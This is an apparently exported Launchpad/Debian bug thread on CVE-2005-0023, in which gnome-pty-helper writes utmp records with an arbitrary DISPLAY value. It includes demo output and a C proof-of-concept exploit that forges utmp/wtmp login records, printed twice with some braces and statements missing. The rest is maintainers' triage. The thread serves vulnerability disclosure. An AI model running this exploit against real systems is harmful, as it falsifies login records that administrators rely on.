@@ -1,0 +1,1618 @@
+Bug #22052: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+URL: https://bugs.launchpad.net/ubuntu/+source/libzvt/+bug/22052
+
+Metadata: security_related=true; information_type=Public Security; targets=Gnome Virtual Terminal Emulator (Expired, High), libzvt (Ubuntu) (Won't Fix, Low), vte (Ubuntu) (Triaged, Medium), libzvt (Debian) (Fix Released, Unknown), vte (Debian) (Fix Released, Unknown)
+
+Description:
+Automatically imported from Debian bug report #329156 http://bugs.debian.org/329156
+
+http://bugzilla.gnome.org/show_bug.cgi?id=317312: http://bugzilla.gnome.org/show_bug.cgi?id=317312
+
+Discussion:
+Message 1 | Author: psz-maths | Subject: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Package: libzvt2
+Version: 1.4.2-19
+Severity: critical
+File: /usr/sbin/gnome-pty-helper
+Justification: root security hole
+
+gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+existing records.
+
+Demo output, code below.
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+OUTPUT:
+
+psz@savona:~$ gnome-pty-helper-exploit xyz & sleep 1; who; ps aux | grep psz; sleep 6; who
+[1] 31444
+Writing utmp (who) record for DISPLAY=xyz
+Running who | grep xyz
+psz      pts/2        Sep 20 08:40 (xyz)
+utmp (who) record will be cleaned up when we exit.
+To leave it behind, kill gnome-pty-helper: kill 31446
+Sleeping for 5 secs...
+psz      pts/2        Sep 20 08:40 (xyz)
+psz      pts/1        Sep 20 08:33 (y622.yt.maths.usyd.edu.au:0.0)
+USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+psz      31358  0.0  0.3 10340 7768 ?        S    08:14   0:00 xterm -T psz@savona -n psz@savona -sb -sl 10000 -ls
+psz      31444  0.0  0.0  1484  380 pts/1    S    08:21   0:00 gnome-pty-helper-exploit xyz
+psz      31446  0.0  0.0  1696  604 pts/1    S    08:21   0:00 gnome-pty-helper
+psz      31454  0.0  0.0  2496  848 pts/1    R+   08:21   0:00 ps aux
+[1]+  Done                    gnome-pty-helper-exploit xyz
+psz      pts/1        Sep 20 08:33 (y622.yt.maths.usyd.edu.au:0.0)
+
+CODE:
+
+/*
+    Must be compiled against (within)
+	gnome-libs-1.4.2/zvt
+    because it uses *.h files from there.
+    Code "stolen" from subshell.c .
+*/
+
+#include <sys/types.h>
+
+#include "subshell-includes.h"
+#define ZVT_TERM_DO_UTMP_LOG 1
+#define ZVT_TERM_DO_WTMP_LOG 2
+#define ZVT_TERM_DO_LASTLOG  4
+
+/* Pid of the helper SUID process */
+static pid_t helper_pid;
+
+/* The socketpair used for the protocol */
+int helper_socket_protocol  [2];
+
+/* The parallel socketpair used to transfer file descriptors */
+int helper_socket_fdpassing [2];
+
+#include <sys/socket.h>
+#include <sys/uio.h>
+
+static struct cmsghdr *cmptr;
+#define CONTROLLEN  sizeof (struct cmsghdr) + sizeof (int)
+
+static int
+receive_fd (int helper_fd)
+{
+	struct iovec iov [1];
+	struct msghdr msg;
+	char buf [32];
+
+	iov [0].iov_base = buf;
+	iov [0].iov_len  = sizeof (buf);
+	msg.msg_iov      = iov;
+	msg.msg_iovlen   = 1;
+	msg.msg_name     = NULL;
+	msg.msg_namelen  = 0;
+
+	if (cmptr == NULL && (cmptr = malloc (CONTROLLEN)) == NULL)
+		return -1;
+	msg.msg_control = (caddr_t) cmptr;
+	msg.msg_controllen = CONTROLLEN;
+
+	if (recvmsg (helper_fd, &msg, 0) <= 0)
+		return -1;
+
+	return *(int *) CMSG_DATA (cmptr);
+}
+
+static int
+s_pipe (int fd [2])
+{
+	return socketpair (AF_UNIX, SOCK_STREAM, 0, fd);
+}
+
+static void *
+get_ptys (int *master, int *slave, int update_wutmp)
+{
+	GnomePtyOps op;
+	int result, n;
+	void *tag;
+
+	if (helper_pid == -1)
+		return NULL;
+
+	if (helper_pid == 0){
+		if (s_pipe (helper_socket_protocol) == -1)
+			return NULL;
+
+		if (s_pipe (helper_socket_fdpassing) == -1){
+			close (helper_socket_protocol [0]);
+			close (helper_socket_protocol [1]);
+			return NULL;
+		}
+
+		helper_pid = fork ();
+
+		if (helper_pid == -1){
+			close (helper_socket_protocol [0]);
+			close (helper_socket_protocol [1]);
+			close (helper_socket_fdpassing [0]);
+			close (helper_socket_fdpassing [1]);
+
+		if (helper_pid == 0){
+			close (0);
+			close (1);
+			dup2 (helper_socket_protocol  [1], 0);
+			dup2 (helper_socket_fdpassing [1], 1);
+
+			/* Close aliases */
+			close (helper_socket_protocol  [0]);
+			close (helper_socket_protocol  [1]);
+			close (helper_socket_fdpassing [0]);
+			close (helper_socket_fdpassing [1]);
+
+			execl ("/usr/sbin/gnome-pty-helper", "gnome-pty-helper", NULL);
+			exit (1);
+		} else {
+			close (helper_socket_fdpassing [1]);
+
+			/*
+			 * Set the close-on-exec flag for the other
+			 * descriptors, these should never propagate
+			 * (otherwise gnome-pty-heler wont notice when
+			 * this process is killed).
+			 */
+			fcntl (helper_socket_protocol [0], F_SETFD, FD_CLOEXEC);
+			fcntl (helper_socket_fdpassing [0], F_SETFD, FD_CLOEXEC);
+	op = GNOME_PTY_OPEN_NO_DB_UPDATE;
+
+	if (update_wutmp & ZVT_TERM_DO_UTMP_LOG){
+		if (update_wutmp & (ZVT_TERM_DO_WTMP_LOG | ZVT_TERM_DO_LASTLOG))
+			op = GNOME_PTY_OPEN_PTY_LASTLOGUWTMP;
+		else if (update_wutmp & ZVT_TERM_DO_WTMP_LOG)
+			op = GNOME_PTY_OPEN_PTY_UWTMP;
+		else if (update_wutmp & ZVT_TERM_DO_LASTLOG)
+			op = GNOME_PTY_OPEN_PTY_LASTLOGUTMP;
+		else
+			op = GNOME_PTY_OPEN_PTY_UTMP;
+	} else if (update_wutmp & ZVT_TERM_DO_WTMP_LOG) {
+		if (update_wutmp & (ZVT_TERM_DO_WTMP_LOG | ZVT_TERM_DO_LASTLOG))
+			op = GNOME_PTY_OPEN_PTY_LASTLOGWTMP;
+		else if (update_wutmp & ZVT_TERM_DO_WTMP_LOG)
+			op = GNOME_PTY_OPEN_PTY_WTMP;
+	} else
+		if (update_wutmp & ZVT_TERM_DO_LASTLOG)
+			op = GNOME_PTY_OPEN_PTY_LASTLOG;
+
+	if (write (helper_socket_protocol [0], &op, sizeof (op)) < 0)
+
+	n = read (helper_socket_protocol [0], &result, sizeof (result));
+	if (n == -1 || n != sizeof (result)){
+		helper_pid = 0;
+
+	if (result == 0)
+
+	n = read (helper_socket_protocol [0], &tag, sizeof (tag));
+
+	if (n == -1 || n != sizeof (tag)){
+		helper_pid = 0;
+
+	*master = receive_fd (helper_socket_fdpassing [0]);
+	*slave  = receive_fd (helper_socket_fdpassing [0]);
+
+	return tag;
+
+int main (int argc, char* argv[])
+	int slave_pty, master_pty;
+	void* mytag;
+	int log = ZVT_TERM_DO_UTMP_LOG;
+	char buf[1000];
+
+printf("Writing utmp (who) record for DISPLAY=%s\n", argv[1]);
+setenv("DISPLAY",argv[1],1);
+
+	if ((mytag = get_ptys (&master_pty, &slave_pty, log)) == NULL)
+		return;
+
+sprintf(buf,"who | grep %s",argv[1]);
+printf("Running %s\n",buf);
+system(buf);
+printf("utmp (who) record will be cleaned up when we exit.\n");
+printf("To leave it behind, kill gnome-pty-helper: kill %d\n",helper_pid);
+
+printf("Sleeping for 5 secs...\n");
+sleep (5);
+
+-- System Information:
+Debian Release: 3.1
+Kernel: Linux 2.6.8-spm0.5
+Locale: LANG=C, LC_CTYPE=C (charmap=ANSI_X3.4-1968)
+
+Versions of packages libzvt2 depends on:
+ii  gdk-imlib1             1.9.14-16.2       imaging library for use with gtk (
+ii  libc6                  2.3.2.ds1-22      GNU C Library: Shared libraries an
+ii  libglib1.2             1.2.10-9          The GLib library of C routines
+ii  libgtk1.2              1.2.10-17         The GIMP Toolkit set of widgets fo
+ii  libx11-6               4.3.0.dfsg.1-14   X Window System protocol client li
+ii  xlibs                  4.3.0.dfsg.1-14   X Keyboard Extension (XKB) configu
+ii  zlib1g                 1:1.2.2-4.sarge.2 compression library - runtime
+
+-- no debconf information
+
+---
+Message 2 | Author: vorlon | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+On Tue, Sep 20, 2005 at 09:01:20AM +1000, Paul Szabo wrote:
+> Package: libzvt2
+> Version: 1.4.2-19
+> Severity: critical
+> File: /usr/sbin/gnome-pty-helper
+> Justification: root security hole
+
+> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+> existing records.
+
+Why is this filed at severity: critical?  What is the attack vector here
+which permits root privilege escalation?
+
+--
+Steve Langasek                   Give me a lever long enough and a Free OS
+Debian Developer                   to set it on, and I can move the world.
+<email address hidden>                                   http://www.debian.org/
+
+---
+Message 4 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-Id: <email address hidden>
+From: Paul Szabo <email address hidden>
+To: Debian Bug Tracking System <email address hidden>
+Subject: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+Package: libzvt2
+Version: 1.4.2-19
+Severity: critical
+File: /usr/sbin/gnome-pty-helper
+Justification: root security hole
+
+gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+existing records.
+
+Demo output, code below.
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+OUTPUT:
+
+psz@savona:~$ gnome-pty-helper-exploit xyz & sleep 1; who; ps aux | grep psz; sleep 6; who
+[1] 31444
+Writing utmp (who) record for DISPLAY=xyz
+Running who | grep xyz
+psz      pts/2        Sep 20 08:40 (xyz)
+utmp (who) record will be cleaned up when we exit.
+To leave it behind, kill gnome-pty-helper: kill 31446
+Sleeping for 5 secs...
+psz      pts/2        Sep 20 08:40 (xyz)
+psz      pts/1        Sep 20 08:33 (y622.yt.maths.usyd.edu.au:0.0)
+USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+psz      31358  0.0  0.3 10340 7768 ?        S    08:14   0:00 xterm -T psz@savona -n psz@savona -sb -sl 10000 -ls
+psz      31444  0.0  0.0  1484  380 pts/1    S    08:21   0:00 gnome-pty-helper-exploit xyz
+psz      31446  0.0  0.0  1696  604 pts/1    S    08:21   0:00 gnome-pty-helper
+psz      31454  0.0  0.0  2496  848 pts/1    R+   08:21   0:00 ps aux
+[1]+  Done                    gnome-pty-helper-exploit xyz
+psz      pts/1        Sep 20 08:33 (y622.yt.maths.usyd.edu.au:0.0)
+
+CODE:
+
+/*
+    Must be compiled against (within)
+	gnome-libs-1.4.2/zvt
+    because it uses *.h files from there.
+    Code "stolen" from subshell.c .
+*/
+
+#include <sys/types.h>
+
+#include "subshell-includes.h"
+#define ZVT_TERM_DO_UTMP_LOG 1
+#define ZVT_TERM_DO_WTMP_LOG 2
+#define ZVT_TERM_DO_LASTLOG  4
+
+/* Pid of the helper SUID process */
+static pid_t helper_pid;
+
+/* The socketpair used for the protocol */
+int helper_socket_protocol  [2];
+
+/* The parallel socketpair used to transfer file descriptors */
+int helper_socket_fdpassing [2];
+
+#include <sys/socket.h>
+#include <sys/uio.h>
+
+static struct cmsghdr *cmptr;
+#define CONTROLLEN  sizeof (struct cmsghdr) + sizeof (int)
+
+static int
+receive_fd (int helper_fd)
+{
+	struct iovec iov [1];
+	struct msghdr msg;
+	char buf [32];
+
+	iov [0].iov_base = buf;
+	iov [0].iov_len  = sizeof (buf);
+	msg.msg_iov      = iov;
+	msg.msg_iovlen   = 1;
+	msg.msg_name     = NULL;
+	msg.msg_namelen  = 0;
+
+	if (cmptr == NULL && (cmptr = malloc (CONTROLLEN)) == NULL)
+		return -1;
+	msg.msg_control = (caddr_t) cmptr;
+	msg.msg_controllen = CONTROLLEN;
+
+	if (recvmsg (helper_fd, &msg, 0) <= 0)
+		return -1;
+
+	return *(int *) CMSG_DATA (cmptr);
+}
+
+static int
+s_pipe (int fd [2])
+{
+	return socketpair (AF_UNIX, SOCK_STREAM, 0, fd);
+}
+
+static void *
+get_ptys (int *master, int *slave, int update_wutmp)
+{
+	GnomePtyOps op;
+	int result, n;
+	void *tag;
+
+	if (helper_pid == -1)
+		return NULL;
+
+	if (helper_pid == 0){
+		if (s_pipe (helper_socket_protocol) == -1)
+			return NULL;
+
+		if (s_pipe (helper_socket_fdpassing) == -1){
+			close (helper_socket_protocol [0]);
+			close (helper_socket_protocol [1]);
+			return NULL;
+		}
+
+		helper_pid = fork ();
+
+		if (helper_pid == -1){
+			close (helper_socket_protocol [0]);
+			close (helper_socket_protocol [1]);
+			close (helper_socket_fdpassing [0]);
+			close (helper_socket_fdpassing [1]);
+
+		if (helper_pid == 0){
+			close (0);
+			close (1);
+			dup2 (helper_socket_protocol  [1], 0);
+			dup2 (helper_socket_fdpassing [1], 1);
+
+			/* Close aliases */
+			close (helper_socket_protocol  [0]);
+			close (helper_socket_protocol  [1]);
+			close (helper_socket_fdpassing [0]);
+			close (helper_socket_fdpassing [1]);
+
+			execl ("/usr/sbin/gnome-pty-helper", "gnome-pty-helper", NULL);
+			exit (1);
+		} else {
+			close (helper_socket_fdpassing [1]);
+
+			/*
+			 * Set the close-on-exec flag for the other
+			 * descriptors, these should never propagate
+			 * (otherwise gnome-pty-heler wont notice when
+			 * this process is killed).
+			 */
+			fcntl (helper_socket_protocol [0], F_SETFD, FD_CLOEXEC);
+			fcntl (helper_socket_fdpassing [0], F_SETFD, FD_CLOEXEC);
+	op = GNOME_PTY_OPEN_NO_DB_UPDATE;
+
+	if (update_wutmp & ZVT_TERM_DO_UTMP_LOG){
+		if (update_wutmp & (ZVT_TERM_DO_WTMP_LOG | ZVT_TERM_DO_LASTLOG))
+			op = GNOME_PTY_OPEN_PTY_LASTLOGUWTMP;
+		else if (update_wutmp & ZVT_TERM_DO_WTMP_LOG)
+			op = GNOME_PTY_OPEN_PTY_UWTMP;
+		else if (update_wutmp & ZVT_TERM_DO_LASTLOG)
+			op = GNOME_PTY_OPEN_PTY_LASTLOGUTMP;
+		else
+			op = GNOME_PTY_OPEN_PTY_UTMP;
+	} else if (update_wutmp & ZVT_TERM_DO_WTMP_LOG) {
+		if (update_wutmp & (ZVT_TERM_DO_WTMP_LOG | ZVT_TERM_DO_LASTLOG))
+			op = GNOME_PTY_OPEN_PTY_LASTLOGWTMP;
+		else if (update_wutmp & ZVT_TERM_DO_WTMP_LOG)
+			op = GNOME_PTY_OPEN_PTY_WTMP;
+	} else
+		if (update_wutmp & ZVT_TERM_DO_LASTLOG)
+			op = GNOME_PTY_OPEN_PTY_LASTLOG;
+
+	if (write (helper_socket_protocol [0], &op, sizeof (op)) < 0)
+
+	n = read (helper_socket_protocol [0], &result, sizeof (result));
+	if (n == -1 || n != sizeof (result)){
+		helper_pid = 0;
+
+	if (result == 0)
+
+	n = read (helper_socket_protocol [0], &tag, sizeof (tag));
+
+	if (n == -1 || n != sizeof (tag)){
+		helper_pid = 0;
+
+	*master = receive_fd (helper_socket_fdpassing [0]);
+	*slave  = receive_fd (helper_socket_fdpassing [0]);
+
+	return tag;
+
+int main (int argc, char* argv[])
+	int slave_pty, master_pty;
+	void* mytag;
+	int log = ZVT_TERM_DO_UTMP_LOG;
+	char buf[1000];
+
+printf("Writing utmp (who) record for DISPLAY=%s\n", argv[1]);
+setenv("DISPLAY",argv[1],1);
+
+	if ((mytag = get_ptys (&master_pty, &slave_pty, log)) == NULL)
+		return;
+
+sprintf(buf,"who | grep %s",argv[1]);
+printf("Running %s\n",buf);
+system(buf);
+printf("utmp (who) record will be cleaned up when we exit.\n");
+printf("To leave it behind, kill gnome-pty-helper: kill %d\n",helper_pid);
+
+printf("Sleeping for 5 secs...\n");
+sleep (5);
+
+-- System Information:
+Debian Release: 3.1
+Kernel: Linux 2.6.8-spm0.5
+Locale: LANG=C, LC_CTYPE=C (charmap=ANSI_X3.4-1968)
+
+Versions of packages libzvt2 depends on:
+ii  gdk-imlib1             1.9.14-16.2       imaging library for use with gtk (
+ii  libc6                  2.3.2.ds1-22      GNU C Library: Shared libraries an
+ii  libglib1.2             1.2.10-9          The GLib library of C routines
+ii  libgtk1.2              1.2.10-17         The GIMP Toolkit set of widgets fo
+ii  libx11-6               4.3.0.dfsg.1-14   X Window System protocol client li
+ii  xlibs                  4.3.0.dfsg.1-14   X Keyboard Extension (XKB) configu
+ii  zlib1g                 1:1.2.2-4.sarge.2 compression library - runtime
+
+-- no debconf information
+
+---
+Message 5 | Author: psz-maths | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Steve,
+
+>> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+>> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+>> existing records.
+>
+> Why is this filed at severity: critical?  What is the attack vector here
+> which permits root privilege escalation?
+
+I do not know any root escalation methods. When using reportbug, those
+options seemed to fit best, apologies if they were not; please change if
+appropriate. (For future reference: which options should I have used
+instead?)
+
+(In fact cannot think of any attacks: cannot think of any "important" uses
+of utmp/wtmp files. I use utmp in some of my own scripts, that is how I
+looked at gnome-tty-helper.)
+
+Cheers, Paul
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 6 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Steve Langasek <email address hidden>
+To: Paul Szabo <email address hidden>, <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+--YD3LsXFS42OYHhNZ
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+On Tue, Sep 20, 2005 at 09:01:20AM +1000, Paul Szabo wrote:
+> Package: libzvt2
+> Version: 1.4.2-19
+> Severity: critical
+> File: /usr/sbin/gnome-pty-helper
+> Justification: root security hole
+
+> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+> existing records.
+
+Why is this filed at severity: critical?  What is the attack vector here
+which permits root privilege escalation?
+
+--=20
+Steve Langasek                   Give me a lever long enough and a Free OS
+Debian Developer                   to set it on, and I can move the world.
+<email address hidden>                                   http://www.debian.org/
+
+--YD3LsXFS42OYHhNZ
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: Digital signature
+Content-Disposition: inline
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.1 (GNU/Linux)
+
+iD8DBQFDL1tVKN6ufymYLloRAiw2AJ9swavyhKadUyYJcstyPanb5WARhgCggNbM
+txoJnEmyWdQGzAiHNOD7PX8=
+=+Y4N
+-----END PGP SIGNATURE-----
+
+--YD3LsXFS42OYHhNZ--
+
+---
+Message 7 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-Id: <email address hidden>
+From: Paul Szabo <email address hidden>
+To: <email address hidden>, <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+Steve,
+
+>> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+>> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+>> existing records.
+>
+> Why is this filed at severity: critical?  What is the attack vector here
+> which permits root privilege escalation?
+
+I do not know any root escalation methods. When using reportbug, those
+options seemed to fit best, apologies if they were not; please change if
+appropriate. (For future reference: which options should I have used
+instead?)
+
+(In fact cannot think of any attacks: cannot think of any "important" uses
+of utmp/wtmp files. I use utmp in some of my own scripts, that is how I
+looked at gnome-tty-helper.)
+
+Cheers, Paul
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 8 | Author: vorlon | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+On Tue, Sep 20, 2005 at 11:05:10AM +1000, Paul Szabo wrote:
+
+> >> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> >> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+> >> existing records.
+
+> > Why is this filed at severity: critical?  What is the attack vector here
+> > which permits root privilege escalation?
+
+> I do not know any root escalation methods. When using reportbug, those
+> options seemed to fit best, apologies if they were not; please change if
+> appropriate. (For future reference: which options should I have used
+> instead?)
+
+Hmm... After rereading the definition at
+<http://www.debian.org/Bugs/Developer#severities>, I guess there's no reason
+for this bug to not fall under the description of 'critical', since the
+security hole is present just from the installation of the package.
+
+Cheers,
+--
+Steve Langasek                   Give me a lever long enough and a Free OS
+Debian Developer                   to set it on, and I can move the world.
+<email address hidden>                                   http://www.debian.org/
+
+---
+Message 9 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: Steve Langasek <email address hidden>
+To: Paul Szabo <email address hidden>
+Cc: <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+--ZPt4rx8FFjLCG7dd
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+
+On Tue, Sep 20, 2005 at 11:05:10AM +1000, Paul Szabo wrote:
+
+> >> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> >> DISPLAY (host) settings. I am not sure if it can be tricked into erasi=
+ng
+> >> existing records.
+
+> > Why is this filed at severity: critical?  What is the attack vector here
+> > which permits root privilege escalation?
+
+> I do not know any root escalation methods. When using reportbug, those
+> options seemed to fit best, apologies if they were not; please change if
+> appropriate. (For future reference: which options should I have used
+> instead?)
+
+Hmm... After rereading the definition at
+<http://www.debian.org/Bugs/Developer#severities>, I guess there's no reason
+for this bug to not fall under the description of 'critical', since the
+security hole is present just from the installation of the package.
+
+Cheers,
+--=20
+Steve Langasek                   Give me a lever long enough and a Free OS
+Debian Developer                   to set it on, and I can move the world.
+<email address hidden>                                   http://www.debian.org/
+
+--ZPt4rx8FFjLCG7dd
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: Digital signature
+Content-Disposition: inline
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.1 (GNU/Linux)
+
+iD8DBQFDL41GKN6ufymYLloRAkMkAJ9fiz9tp71jQy75hq3MZIvZ4m3soQCeOpBA
+y/pXKyUx/P/kXtRPo+6R4C8=
+=+Uvm
+-----END PGP SIGNATURE-----
+
+--ZPt4rx8FFjLCG7dd--
+
+---
+Message 10 | Author: pitti | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Uh, another package that should have never found its way to the seeds. It is
+only used by some Gnome 1 universe packages. I throwed it out of Breezy, but
+Warty and Hoary have to be fixed, of course. But it does not seem to be overly
+urgent, so I wait for an upstream solution.
+
+---
+Message 11 | Author: lool | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Hi,
+
+On Tue, Sep 20, 2005, Paul Szabo wrote:
+> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> DISPLAY (host) settings. I am not sure if it can be tricked into erasing
+> existing records.
+
+ Thanks for your report.
+
+ Do you have a CVE ID for this security issue?
+
+ Did you check whether libvte4 is affected?
+
+ Do you have a fix?
+
+   Thanks,
+
+--
+Loïc Minier <email address hidden>
+
+---
+Message 12 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+To: Paul Szabo <email address hidden>, <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+        Hi,
+
+On Tue, Sep 20, 2005, Paul Szabo wrote:
+> gnome-pty-helper can be made to write utmp/wtmp records with arbitrary
+> DISPLAY (host) settings. I am not sure if it can be tricked into erasin=
+g
+> existing records.
+
+ Thanks for your report.
+
+ Do you have a CVE ID for this security issue?
+
+ Did you check whether libvte4 is affected?
+
+ Do you have a fix?
+
+   Thanks,
+
+--=20
+Lo=EFc Minier <email address hidden>
+
+---
+Message 13 | Author: psz-maths | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Dear Loic,
+
+>  Do you have a CVE ID for this security issue?
+
+No. Sorry, I do not know how to get one. (Nor am sure if this is serious
+enough to deserve one.)
+
+>  Did you check whether libvte4 is affected?
+
+No. Do not know what libvte4 is.
+
+>  Do you have a fix?
+
+No. (Fanciful idea: try running xhost, if it fails then surely you do not
+"own" that display. Slow, maybe secure. That is what I use now.)
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 14 | Author: lool | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+On Mon, Sep 26, 2005, Paul Szabo wrote:
+> No. Sorry, I do not know how to get one. (Nor am sure if this is serious
+> enough to deserve one.)
+
+ Then I'll see whether it deserves one, and attempt to request one.
+
+> >  Did you check whether libvte4 is affected?
+> No. Do not know what libvte4 is.
+
+ libvte4 is the GNOME 2 zquivalent of libzvt2, you can grab it from:
+    <http://packages.debian.org/>
+ the source package for this library is "vte".
+
+ I'd be nice if you could check whether the gnome-pty-helper shipped in
+ libvte4 is affected too.  Let me know if you don't have a setup
+ permitting the check, or if you lack the time.
+
+   Bye,
+
+--
+Loïc Minier <email address hidden>
+
+---
+Message 15 | Author: psz-maths | Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Dear Loic,
+
+>> >  Did you check whether libvte4 is affected?
+>> No. Do not know what libvte4 is.
+>
+> libvte4 is the GNOME 2 zquivalent of libzvt2 ...
+> I'd be nice if you could check whether the gnome-pty-helper shipped in
+> libvte4 is affected too.  Let me know if you don't have a setup
+> permitting the check, or if you lack the time.
+
+Looking at the source
+
+  vte-0.11.15/gnome-pty-helper/gnome-pty-helper.c
+
+in line 682 it grabs
+	display_name = getenv ("DISPLAY");
+and uses it without any sanity checks: yes, surely it is also affected.
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 16 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-Id: <email address hidden>
+From: Paul Szabo <email address hidden>
+To: <email address hidden>, <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+Dear Loic,
+
+>  Do you have a CVE ID for this security issue?
+
+No. Sorry, I do not know how to get one. (Nor am sure if this is serious
+enough to deserve one.)
+
+>  Did you check whether libvte4 is affected?
+
+No. Do not know what libvte4 is.
+
+>  Do you have a fix?
+
+No. (Fanciful idea: try running xhost, if it fails then surely you do not
+"own" that display. Slow, maybe secure. That is what I use now.)
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 17 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-ID: <email address hidden>
+From: =?iso-8859-1?Q?Lo=EFc?= Minier <email address hidden>
+To: Paul Szabo <email address hidden>
+Cc: <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+On Mon, Sep 26, 2005, Paul Szabo wrote:
+> No. Sorry, I do not know how to get one. (Nor am sure if this is seriou=
+s
+> enough to deserve one.)
+
+ Then I'll see whether it deserves one, and attempt to request one.
+
+> >  Did you check whether libvte4 is affected?
+> No. Do not know what libvte4 is.
+
+ libvte4 is the GNOME 2 zquivalent of libzvt2, you can grab it from:
+    <http://packages.debian.org/>
+ the source package for this library is "vte".
+
+ I'd be nice if you could check whether the gnome-pty-helper shipped in
+ libvte4 is affected too.  Let me know if you don't have a setup
+ permitting the check, or if you lack the time.
+
+   Bye,
+
+--=20
+Lo=EFc Minier <email address hidden>
+
+---
+Message 18 | Author: debzilla | Subject: Re: [CVE-2005-0023] /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+Message-Id: <email address hidden>
+From: Paul Szabo <email address hidden>
+To: <email address hidden>
+Cc: <email address hidden>
+Subject: Re: Bug#329156: /usr/sbin/gnome-pty-helper: writes arbitrary utmp records
+
+Dear Loic,
+
+>> >  Did you check whether libvte4 is affected?
+>> No. Do not know what libvte4 is.
+>
+> libvte4 is the GNOME 2 zquivalent of libzvt2 ...
+> I'd be nice if you could check whether the gnome-pty-helper shipped in
+> libvte4 is affected too.  Let me know if you don't have a setup
+> permitting the check, or if you lack the time.
+
+Looking at the source
+
+  vte-0.11.15/gnome-pty-helper/gnome-pty-helper.c
+
+in line 682 it grabs
+	display_name = getenv ("DISPLAY");
+and uses it without any sanity checks: yes, surely it is also affected.
+
+Cheers,
+
+Paul Szabo   <email address hidden>   http://www.maths.usyd.edu.au/u/psz/
+School of Mathematics and Statistics   University of Sydney    Australia
+
+---
+Message 19 | Author: mdz | Subject: CVE name
